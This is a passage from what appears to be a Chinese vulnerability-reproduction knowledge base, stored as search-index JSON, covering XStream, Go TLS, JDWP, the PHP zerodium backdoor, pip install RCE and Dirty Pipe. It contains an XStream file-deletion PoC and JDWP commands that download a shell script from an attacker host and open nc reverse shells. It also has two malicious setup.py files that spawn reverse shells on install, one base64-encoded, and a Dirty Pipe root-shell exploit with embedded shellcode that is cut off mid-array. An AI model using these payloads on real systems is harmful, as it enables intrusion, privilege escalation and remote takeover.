","date":"0001-01-01","objectID":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/:3:0","tags":null,"title":"","uri":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/"},{"categories":null,"content":"XStream 任意文件删除 反序列化漏洞 CVE-2020-26259 ","date":"0001-01-01","objectID":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/:0:0","tags":null,"title":"","uri":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/"},{"categories":null,"content":"漏洞描述 Xstream 是 Java 类库，用来将对象序列化成 XML (JSON) 或反序列化为对象。XStream 是一款开源软件，允许在 BSD 许可证的许可下分发。 参考链接： https://x-stream.github.io/CVE-2020-26259.html ","date":"0001-01-01","objectID":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/:1:0","tags":null,"title":"","uri":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/"},{"categories":null,"content":"漏洞影响 影响版本： Xstream \u003c = 1.4.14 修复版本： Xstream \u003c = 1.4.15 ","date":"0001-01-01","objectID":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/:2:0","tags":null,"title":"","uri":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/"},{"categories":null,"content":"漏洞复现 poc： import com.thoughtworks.xstream.XStream; /* CVE-2020-26259: XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long as the executing process has sufficient rights. https://x-stream.github.io/CVE-2020-26259.html Security framework of XStream not explicitly initialized, using predefined black list on your own risk. */ public class CVE_2020_26259 { public static void main(String[] args) { String xml_poc = \"\u003cmap\u003e\\n\" + \" \u003centry\u003e\\n\" + \" \u003cjdk.nashorn.internal.objects.NativeString\u003e\\n\" + \" \u003cflags\u003e0\u003c/flags\u003e\\n\" + \" \u003cvalue class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'\u003e\\n\" + \" \u003cdataHandler\u003e\\n\" + \" \u003cdataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'\u003e\\n\" + \" \u003ccontentType\u003etext/plain\u003c/contentType\u003e\\n\" + \" \u003cis class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'\u003e\\n\" + \" \u003ctempFile\u003e/tmp/CVE-2020-26259\u003c/tempFile\u003e\\n\" + \" \u003c/is\u003e\\n\" + \" \u003c/dataSource\u003e\\n\" + \" \u003ctransferFlavors/\u003e\\n\" + \" \u003c/dataHandler\u003e\\n\" + \" \u003cdataLen\u003e0\u003c/dataLen\u003e\\n\" + \" \u003c/value\u003e\\n\" + \" \u003c/jdk.nashorn.internal.objects.NativeString\u003e\\n\" + \" \u003cstring\u003etest\u003c/string\u003e\\n\" + \" \u003c/entry\u003e\\n\" + \"\u003c/map\u003e\"; XStream xstream = new XStream(); xstream.fromXML(xml_poc); } } ","date":"0001-01-01","objectID":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/:3:0","tags":null,"title":"","uri":"/xstream-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26259/"},{"categories":null,"content":"GO TLS握手 崩溃漏洞 CVE-2021-34558 ","date":"0001-01-01","objectID":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/:0:0","tags":null,"title":"","uri":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/"},{"categories":null,"content":"漏洞描述 There is a minor modification to ./vendor/github.com/refraction-networking/utls/handshake_server.go to enable the malicious handshake to be sent with a mismatching certificate/cipher. ","date":"0001-01-01","objectID":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/:1:0","tags":null,"title":"","uri":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/"},{"categories":null,"content":"漏洞影响 Go Version \u003c (1.16.6+) ","date":"0001-01-01","objectID":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/:2:0","tags":null,"title":"","uri":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/"},{"categories":null,"content":"漏洞复现 将会生成 https 服务，此时当版本较低时就会产生崩溃，例如部分扫描器对目标进行扫描时 ","date":"0001-01-01","objectID":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/:3:0","tags":null,"title":"","uri":"/go-tls%E6%8F%A1%E6%89%8B-%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E-cve-2021-34558/"},{"categories":null,"content":"JDWP调试接口 RCE 漏洞 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。 JDWP是JVM或者类JVM的虚拟机都支持的一种协议，通过该协议，Debugger端和被调试JVM之间进行通信，可以获取被调试JVM的包括类、对象、线程等信息。 参考阅读： https://forum.butian.net/share/1232 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Windows 下载Tomcat到本地，在bin\\startup.bat文件中添加如下代码开启debug模式： SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 点击运行 startup.bat ，以debug模式启动Tomcat。 Listening for transport dt_socket at address: 8000，表示JDWP服务已经监听在8000端口，等待调试器连接。 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:2:1","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Linux 执行如下命令安装Tomcat： # 执行wget命令下载Tomcat安装包 wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz # 解压安装包 tar zxvf apache-tomcat-8.5.43.tar.gz # 将程序安装包复制到指定运行目录下 sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8 启动方式一： 进入Tomcat安装目录下的bin目录下找到 catalina.sh 文件，在文件开头部分添加如下一行： CATALINA_OPTS=\"-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000\" 修改完成后，执行脚本./startup.sh就会以debug模式启动Tomcat。 启动方式二： 进入Tomcat的bin目录，输入 ./catalina.sh jpda run 或者 ./catalina.sh jpda start 命令以调试模式启动tomcat。 启动时就会出现如下信息提示： Listening for transport dt_socket at address: 8000。 注意脚本中默认配置JDWP是监听在本地的8000端口，修改JDPA_ADDRESS的值对外开放此端口，在JDK9及以上的版本需要修改为JDPA_ADDRESS=*:8000 ，在JDK9以下版本修改为JDPA_ADDRESS=8000 即可 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:2:2","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞检测 有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送JDWP-Handshake，如果目标服务直接返回一样的内容则说明是JDWP服务。 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Nmap 扫描会识别到JDWP服务，且有对应的JDK版本信息。 nmap -sT -sV 192.168.192.1 -p 8000 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:3:1","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Telnet 使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务。 telnet 192.168.182.130 8000 注意：需要马上输入JDWP-Handshake，并按下回车，不然马上就会断开。在Linux系统下使用telnet测试可以，在Windows系统下使用telnet测试不太行。 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:3:2","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Python 使用如下脚本扫描，直接连接目标服务器，并向目标发送JDWP-Handshake，如果能接收到相同内容则说明目标是开启了JDWP服务。 import socket host = \"192.168.182.130\" port = 8000 try: client = socket.socket() client.connect((host, port)) client.send(b\"JDWP-Handshake\") if client.recv(1024) == b\"JDWP-Handshake\": print(\"[*] {}:{} Listening JDWP Service! \".format(host, port)) except Exception as e: print(\"[-] Connection failed! \") finally: client.close() ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:3:3","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"POC1 poc1：https://github.com/IOActive/jdwp-shellifier jdwp-shellifier是使用Python2编写的，该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。 该漏洞无回显，可利用dnslog进行探测： python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on \"java.lang.String.indexof\" --cmd \"ping xxx.dnslog.cn\" 反弹shell 准备反弹shell文件，保存为shell.txt： nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444% 启动http服务： python3 -m http.server 8000 开启监听，需要开启2个监听，前面一个输入执行命令，后面一个输出命令执行结果： nc -lvvp 3333 nc -lvvp 4444 利用poc1执行命令，下载shell、文件可执行权限、执行shell： python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on \"java.lang.String.indexof\" --cmd \"wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh\" python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on \"java.lang.String.indexof\" --cmd \"chmod a+x /tmp/shell.sh\" python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on \"java.lang.String.indexof\" --cmd \"/tmp/shell.sh\" 两个监听都收到shell，一个输入命令，一个输出结果。 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:4:1","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"POC2 poc2：https://github.com/Lz1y/jdwp-shellifier 该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对Sleeping的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:4:2","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"修复建议 关闭JDWP端口，或者JDWP端口不对公网开放 关闭Java的debug模式 ","date":"0001-01-01","objectID":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PHP zerodium后门漏洞 ","date":"0001-01-01","objectID":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。 目前为止PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。 ","date":"0001-01-01","objectID":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 PHP 8.1.0-dev ","date":"0001-01-01","objectID":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"PHP/8.1.0-dev\" ","date":"0001-01-01","objectID":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 后门为添加请求头 User-Agentt: zerodiumsystem('id'); 是 User-Agentt 不是 User-Agent 反弹shell ","date":"0001-01-01","objectID":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/php-zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Python pip install RCE 漏洞 CVE-2013-1629 ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:0:0","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"漏洞描述 当通过 HTTP 从 Pypi 存储库检索包时，不会检查包内容的完整性。利用这个缺陷，攻击者可以通过 pip install 来执行代码。 参考阅读： https://github.com/0x00-0x00/FakePip https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-using-pip/python/sid-2098 ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:1:0","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"影响版本 pip \u003c 1.3 ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:2:0","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:3:0","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"方式1 FakePip 将 setup.py 文件下载到远程目标： $ wget http://your-vps-ip/setup.py 在 VPS 上监听端口，在远程目标上执行命令： $ mkdir fakepip $ mv setup.py fakepip/ $ cd fakepip # sudo /usr/bin/pip install . --upgrade --force-reinstall 成功获取反弹 Shell。 ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:3:1","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"方式2 图片马 将 setup.py 文件放在文件夹中并压缩命名为，选择一张图片 test.png，制作图片马： $ copy /b test.png + pic.zip pic.png 在 VPS 上监听端口，将图片上传至公网图床，复制链接，在远程目标上执行命令： $ pip install \" https://\u003cyour-img-link\u003e\" 也将图片可以上传到 VPS，在远程目标上执行命令： $ pip3 install \"http://192\".\"168\".\"xx\".\"xxx/pic.png\" ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:3:2","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"漏洞POC 方式1 setup.py from setuptools import setup from setuptools.command.install import install import base64 import os class CustomInstall(install): def run(self): install.run(self) LHOST = 'localhost' # change this LPORT = 13372 reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT) encoded = base64.b64encode(reverse_shell) os.system('echo %s|base64 -d|bash' % encoded) setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *', zip_safe=False, cmdclass={'install': CustomInstall}) 方式2 setup.py from setuptools import setup import socket,subprocess,os def run(): import socket, time,pty, os host='{LHOST}' port='{LPORT}' s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(10) s.connect((host,port)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\"HISTFILE\",'/dev/null') pty.spawn(\"/bin/bash\") s.close() run() setup(name=\"FakePip\", version=\"1.0\") ","date":"0001-01-01","objectID":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/:4:0","tags":null,"title":"","uri":"/python-pip-install-rce-%E6%BC%8F%E6%B4%9E-cve-2013-1629/"},{"categories":null,"content":"Linux DirtyPipe权限提升漏洞 CVE-2022-0847 ","date":"0001-01-01","objectID":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/:0:0","tags":null,"title":"","uri":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/"},{"categories":null,"content":"漏洞描述 CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。 CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe” ","date":"0001-01-01","objectID":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/:1:0","tags":null,"title":"","uri":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/"},{"categories":null,"content":"漏洞影响 Linux内核 5.8 及之后版本 ","date":"0001-01-01","objectID":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/:2:0","tags":null,"title":"","uri":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/"},{"categories":null,"content":"漏洞复现 查找具有suid权限的可执行文件 find / -user root -perm /4000 2\u003e/dev/null 编译POC文件后，指定修改的Suid可执行文件，获取root权限 ","date":"0001-01-01","objectID":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/:3:0","tags":null,"title":"","uri":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/"},{"categories":null,"content":"漏洞POC // // dirtypipez.c // // hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn // a root shell. (and attempts to restore the damaged binary as well) // // Wow, Dirty CoW reloaded! // // -- blasty \u003cpeter@haxx.in\u003e // 2022-03-07 /* SPDX-License-Identifier: GPL-2.0 */ /* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann \u003cmax.kellermann@ionos.com\u003e * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * \"pipe_buffer.flags\" variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (\"pipe: merge * anon_pipe_buf*_ops\"). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\\nssh-ed25519 AAA......\\n' * * Further explanation: https://dirtypipe.cm4all.com/ */ #define _GNU_SOURCE #include \u003cunistd.h\u003e #include \u003cfcntl.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/user.h\u003e #include \u003cstdint.h\u003e #ifndef PAGE_SIZE #define PAGE_SIZE 4096 #endif // small (linux x86_64) ELF file matroshka doll that does; // fd = open(\"/tmp/sh\", O_WRONLY | O_CREAT | O_TRUNC); // write(fd, elfcode, elfcode_len) // chmod(\"/tmp/sh\", 04755) // close(fd); // exit(0); // // the dropped ELF simply does: // setuid(0); // setgid(0); // execve(\"/bin/sh\", [\"/bin/sh\", NULL], [NULL]); unsigned char elfcode[] = { /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 0x00, 0x","date":"0001-01-01","objectID":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/:4:0","tags":null,"title":"","uri":"/linux-dirtypipe%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-0847/"},{"categories":null,"content":"Linux eBPF权限提升漏洞 CVE-2022-23222 ","date":"0001-01-01","objectID":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/:0:0","tags":null,"title":"","uri":"/linux-ebpf%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2022-23222/"},{"categories":null,"content":"漏洞描述 Linux Kernel 是美国 Linux 基金会发布的开源操作系统 Linux 